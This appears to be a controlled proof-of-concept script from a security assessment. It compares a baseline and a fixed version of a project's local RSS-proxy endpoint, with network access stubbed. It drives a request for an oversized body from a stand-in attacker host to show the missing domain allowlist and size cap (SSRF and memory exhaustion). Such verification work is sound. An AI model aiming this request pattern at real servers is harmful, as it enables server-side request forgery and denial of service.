#!/usr/bin/env node
/**
 * SIH26163 — F1 controlled PoC (BEFORE / AFTER egress-policy comparison).
 *
 * AUTHORIZED LOCAL ASSESSMENT ONLY. No traffic leaves this machine: DNS and the
 * HTTPS transport are stubbed. worldmonitor.app is never contacted. This is NOT
 * an attack tool — it drives the project's own sidecar module in-process with a
 * synthetic upstream and reports what egress policy the code enforced.
 *
 * It loads TWO copies of the sidecar:
 *   BEFORE — the module content at git tag BASELINE-SIH26163 (original behavior)
 *   AFTER  — the current working-tree module (remediated behavior)
 * and issues the same request to each, so the control gap and its fix are shown
 * side by side from real code, not prose.
 *
 * Usage:  node assessment/poc/f1-rss-proxy-poc.mjs [--json]
 */
import https from 'node:https';
import dns from 'node:dns/promises';
import { EventEmitter } from 'node:events';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { pathToFileURL } from 'node:url';

const REPO = process.cwd();
const TARGET_HOST = 'attacker-chosen.example'; // RFC 2606 reserved; never resolves
const BODY_MB = 64;                             // > hosted 5 MB cap
const TOKEN = 'poc-local-token';
const asJson = process.argv.includes('--json');

async function loadBaselineModule() {
  // Materialize the baseline file content as a sibling of the real sidecar
  // module so its relative imports resolve identically, then import it. BEFORE
  // behavior is thus reproduced deterministically even after the tree is fixed.
  let src;
  try {
    src = execFileSync('git', ['show', 'BASELINE-SIH26163:src-tauri/sidecar/local-api-server.mjs'],
      { cwd: REPO, maxBuffer: 64 * 1024 * 1024 });
  } catch {
    return null; // tag missing (e.g. shallow copy) — BEFORE is skipped, AFTER still runs
  }
  const file = path.join(REPO, 'src-tauri', 'sidecar', '_poc-baseline-local-api-server.mjs');
  await writeFile(file, src);
  return { href: pathToFileURL(file).href, cleanup: () => rm(file, { force: true }) };
}

function installTransport() {
  const original = https.request;
  const seen = [];
  const CHUNK = Buffer.alloc(1024 * 1024, 0x41);
  https.request = (options, onResponse) => {
    seen.push(options.hostname);
    if (typeof options.lookup === 'function') options.lookup(options.hostname, { family: options.family }, () => {});
    const req = new EventEmitter();
    let destroyed = false;
    req.setTimeout = () => {}; req.write = () => {};
    req.destroy = (e) => { destroyed = true; if (e) req.emit('error', e); };
    req.end = () => queueMicrotask(() => {
      const res = new EventEmitter();
      res.statusCode = 200; res.statusMessage = 'OK';
      res.headers = { 'content-type': 'application/octet-stream' };
      onResponse(res);
      let sent = 0;
      const pump = () => {
        if (destroyed) return;
        if (sent >= BODY_MB * 1024 * 1024) { res.emit('end'); return; }
        res.emit('data', CHUNK); sent += CHUNK.length; queueMicrotask(pump);
      };
      pump();
    });
    return req;
  };
  return { restore: () => { https.request = original; }, seen };
}

async function probe(moduleHref, label) {
  const { createLocalApiServer } = await import(moduleHref);
  const prev4 = dns.resolve4, prev6 = dns.resolve6;
  dns.resolve4 = async () => ['93.184.216.34'];
  dns.resolve6 = async () => { const e = new Error('no AAAA'); e.code = 'ENODATA'; throw e; };
  process.env.LOCAL_API_TOKEN = TOKEN;
  const root = await mkdtemp(path.join(os.tmpdir(), 'sih-poc-'));
  await mkdir(path.join(root, 'api'), { recursive: true });
  const app = await createLocalApiServer({ port: 0, mode: 'docker', apiDir: path.join(root, 'api'),
    logger: { log() {}, warn() {}, error() {} } });
  const { port } = await app.start();
  const t = installTransport();
  const rssBefore = process.memoryUsage().rss;
  let status, bytes;
  try {
    const res = await fetch(
      `http://127.0.0.1:${port}/api/rss-proxy?url=${encodeURIComponent(`https://${TARGET_HOST}/large.bin`)}`,
      { headers: { authorization: `Bearer ${TOKEN}`, 'x-worldmonitor-local-token': TOKEN } });
    status = res.status;
    bytes = Buffer.from(await res.arrayBuffer()).length;
  } catch (e) {
    status = 'error'; bytes = 0;
  }
  const rssGrowthMb = Math.round((process.memoryUsage().rss - rssBefore) / 1048576);
  const outboundToTarget = t.seen.includes(TARGET_HOST);
  t.restore(); await app.close(); await rm(root, { recursive: true, force: true });
  dns.resolve4 = prev4; dns.resolve6 = prev6;
  return { label, status, bytes, mib: Math.round(bytes / 1048576), rssGrowthMb, outboundToTarget };
}

const results = {};
const baseline = await loadBaselineModule();
if (baseline) {
  results.before = await probe(baseline.href, 'BEFORE (BASELINE-SIH26163)');
  await baseline.cleanup();
}
results.after = await probe(pathToFileURL(path.join(REPO, 'src-tauri/sidecar/local-api-server.mjs')).href, 'AFTER (working tree)');

if (asJson) {
  console.log(JSON.stringify({ target: TARGET_HOST, requestedBodyMb: BODY_MB, hostedCapBytes: 5 * 1024 * 1024, results }, null, 2));
} else {
  const line = (r) => `  ${r.label}\n    fetched non-allowlisted host : ${r.outboundToTarget}\n    HTTP status returned        : ${r.status}\n    bytes returned to caller    : ${r.bytes} (${r.mib} MB)\n    process RSS growth          : ~${r.rssGrowthMb} MB`;
  console.log('SIH26163 — F1 controlled PoC (no network egress; synthetic upstream)\n');
  console.log(`Target host (reserved, non-allowlisted): ${TARGET_HOST}`);
  console.log(`Requested upstream body: ${BODY_MB} MB   Hosted cap (api/rss-proxy.js): 5 MB\n`);
  if (results.before) console.log(line(results.before), '\n');
  console.log(line(results.after), '\n');
  const b = results.before, a = results.after;
  if (b) {
    console.log('INTERPRETATION:');
    console.log(`  BEFORE: non-allowlisted host ${b.outboundToTarget ? 'WAS fetched' : 'not fetched'}, `
      + `${b.mib} MB returned (no domain allowlist, no size cap).`);
    console.log(`  AFTER : host ${a.outboundToTarget ? 'fetched' : 'REJECTED before any outbound request'} `
      + `(status ${a.status}) — allowlist + size cap enforced.`);
  }
}
